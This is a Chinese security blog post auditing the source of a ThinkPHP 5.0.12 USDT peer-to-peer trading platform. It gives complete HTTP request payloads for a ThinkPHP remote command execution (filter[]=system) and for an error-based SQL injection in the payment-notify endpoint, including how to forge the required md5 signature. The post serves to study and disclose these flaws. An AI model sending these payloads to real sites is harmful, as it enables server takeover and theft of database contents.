#  代码审计某USDT寄售买卖平台系统  
原创 moonsec  moonsec   2025-06-12 02:30  
  
```
免责声明：本公众号所提供的文字和信息仅供学习和研究使用，不得用于任何非法用途。
我们强烈谴责任何非法活动，并严格遵守法律法规。
读者应该自觉遵守法律法规，不得利用本公众号所提供的信息从事任何违法活动。
本公众号不对读者的任何违法行为承担任何责任。
```  
# 1.源码介绍   
  
本程序为Thinkphp5开发，主要解决USDT的供求买卖关系，会员可以在平台挂卖或者购买USDT（通过发布订单的方式），就是一个纯场外虚_拟币的交易平台，只是一个买卖双方的售卖平台。  
# 2.系统搭建  
  
PHP5.6+    MySQL5.5  
  
导入数据库 db_cash.sql  
  
修改数据库链接application/database.php  
  
网站运行目录为：wkb  
  
伪静态规则：thinkphp  
  
后台：/admin.php/login/index?type=admin  
  
设置程序运行目录  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHYbKVpvszuAF9tCdERPWYuhZ7oEczLxzSa7Dn3ZvlePrpRwuB2CibowicvcD6Ev6ibbXoS6dhk6RyA/640?wx_fmt=jpeg&from=appmsg "")  
  
设置伪静态规则  
```
 <IfModule mod_rewrite.c> RewriteEngine on RewriteBase / RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^(.*)$ index.php?s=/$1 [QSA,PT,L]</IfModule>
```  
  
访问网站首页运行正常  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHYbKVpvszuAF9tCdERPWYQnfdjTvKoJbjFgIvhU5LykicNmGpL5libcMNQPiaAibvicFRohibWZxotnAQ/640?wx_fmt=jpeg&from=appmsg "")  
  
访问网站  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHYbKVpvszuAF9tCdERPWYib7OcG1QaPpoKJpvJ70vM8KAMdh4D9uuurqXBdBXXvvJavXxomfu9BQ/640?wx_fmt=jpeg&from=appmsg "")  
# 3.RCE漏洞  
  
查看目录结构   
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHYbKVpvszuAF9tCdERPWYvgDh0tmFPUJwKYHs2TxQB8VibL82cDroELg19g3EABn0mZYwdHiaOibHw/640?wx_fmt=jpeg&from=appmsg "")  
  
查看thinkphp版本 thinkphp/base.php  
```
define('THINK_VERSION', '5.0.12');define('THINK_START_TIME', microtime(true));define('THINK_START_MEM', memory_get_usage());define('EXT', '.php');define('DS', DIRECTORY_SEPARATOR);
```  
  
知道thinkphp版本之后 找对应版本的漏洞    
https://l1ubai.github.io/vuldb/Web%E5%AE%89%E5%85%A8/Thinkphp/Thinkphp%205.x%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.12/  
```
posts=whoami&_method=__construct&method=POST&filter[]=systemaaaa=whoami&_method=__construct&method=GET&filter[]=system_method=__construct&method=GET&filter[]=system&get[]=whoamic=system&f=calc&_method=filter
```  
  
payload  
```
POST /index.do?s=index/index HTTP/1.1Host: www.d9.comReferer: http://www.d9.com/member/market/index.doAccept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateCookie: PHPSESSID=pqsg6lrqu1tnj2hohni11b0merContent-Type: application/x-www-form-urlencodeds=whoami&_method=__construct&method=POST&filter[]=system
```  
  
  
用yakit发包成功返回执行的命令  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHYbKVpvszuAF9tCdERPWYAA9vv6kJHic7grhZM4nQJia9b7Uw2tiaC68vzfa7QPVpgNWRQEYLujGTQ/640?wx_fmt=jpeg&from=appmsg "")  
  
# 4.SQL注入漏洞  
  
漏洞位置 application/member/controller/Notify.php  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHYbKVpvszuAF9tCdERPWYibicWwHRw52icdV4KQSVn6tfaic26CFUlLic9fAiaTKoVfgYZYlJwUiamKicpw/640?wx_fmt=jpeg&from=appmsg "")  
  
在thinkphp5中 直接传递变量到->where函数中会造成SQL注入漏洞  
```
$map['orderid'] = $post['out_trade_no'];$map['status'] = 0;$rs = Db::name("pay")->where($map)->find();
```  
  
在这里利用还要解决签名问题 verifyAll函数 传入的post变量生成sign进行对比  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHYbKVpvszuAF9tCdERPWYibmHkOb4gZtxFiasAEqKdmEcIk3Y3F18pE3jtWxQQLaibZ9RoeQQyAvNg/640?wx_fmt=jpeg&from=appmsg "")  
  
跟进getSignVeryfy函数  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHYbKVpvszuAF9tCdERPWYjhTFkev14kv7PJ4JvRdMQh8TA1RH9iaicOEibrV7XouCG9YxxiaMicKuRng/640?wx_fmt=jpeg&from=appmsg "")  
  
把数组所有元素，按照“参数=参数值”的模式用“&”字符拼接成字符串  $this->codepay_config['key']是一个固定的值 跟进md5Verify函数 这里就是传入的post的md5是否与签名生成的sign一致 一致就通过。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHYbKVpvszuAF9tCdERPWYt66ObFMj8pLSjtDV7w42VMMT9eXG9ZpRxxxsBI1TLcXHyy0pOn0ia0w/640?wx_fmt=jpeg&from=appmsg "")  
  
在这里输入payload 打印一下sign的值  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHYbKVpvszuAF9tCdERPWYRu92CiaP6LvpGKickruz7IAeBWnGKBeRtRwqcGHGuFGDyGXyamKYLyGw/640?wx_fmt=jpeg&from=appmsg "")  
  
yakit提交获取  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHYbKVpvszuAF9tCdERPWYRctl8ZITwyR8q4a1rEsVkvmKH3aDOJ7y4XXBa4uUlS9QC4yEeEXqhw/640?wx_fmt=jpeg&from=appmsg "")  
  
接着拿这个sign值加到post里面即可。  
  
payload  
```
POST /member/Notify/index.do HTTP/1.1Host: www.d9.comReferer: http://www.d9.com/member/market/index.doAccept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateCookie: PHPSESSID=pqsg6lrqu1tnj2hohni11b0merContent-Type: application/x-www-form-urlencodedout_trade_no[]=exp&out_trade_no[]=) union select updatexml(1,concat(0x7,user(),0x7e),1)--+user&sign=4896cc9517ec96817342e275851f6c77
```  
  
yakit提交截图  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHYbKVpvszuAF9tCdERPWYt0ExQ6I31FMHOhjKkyeoChXldXUDicFaW3UkTAt72gx3QhvqYST9llQ/640?wx_fmt=jpeg&from=appmsg "")  
  
5.培训学习  
  
  
🚀 如果你想系统掌握网络安全实战技能，从入门到进阶完成一次能力跃迁，我们提供了高质量的培训课程，内容涵盖 Web 安全、内网渗透、红队对抗、代码审计等方向。  
  
📚 课程由实战经验丰富的讲师教学，适合零基础或有一定基础的学员。  
  
📩 有兴趣了解课程详情，扫一扫 添加月师傅微信  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADHYbKVpvszuAF9tCdERPWY24S9lwibxc4ibHlegNXCr6e0y7nUPicnb8S3OPFicsCAaPIEeaueFsxPEg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
  
  
  
  
  
  
  
